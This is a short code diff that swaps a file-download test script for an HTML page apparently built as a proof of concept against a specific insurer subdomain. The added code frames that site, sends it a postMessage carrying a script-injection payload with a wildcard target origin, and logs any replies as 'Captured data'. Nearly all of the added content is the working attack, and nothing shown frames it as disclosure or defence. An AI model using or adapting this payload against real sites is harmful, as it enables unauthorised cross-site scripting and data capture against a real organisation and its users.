@@ -1,14 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<iframe id="v" src="https://casers-dv1.geico.com/"></iframe>
+
 <script>
-document.addEventListener("DOMContentLoaded", () => {
-    const blob = new Blob(
-        ["<h1>Test</h1><p>Works</p>"],
-        { type: "text/html" }
+  const iframe = document.getElementById("v");
+
+  iframe.onload = () => {
+    iframe.contentWindow.postMessage(
+      JSON.stringify({ action: "<script>alert(origin)</script>" }),
+      "*"
     );
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "test.html";
-    document.body.appendChild(a);
-    a.click();
-});
+  };
+
+  window.addEventListener("message", e => {
+    console.log("Captured data:", e.data);
+  });
 </script>
+
+</body>
+</html>
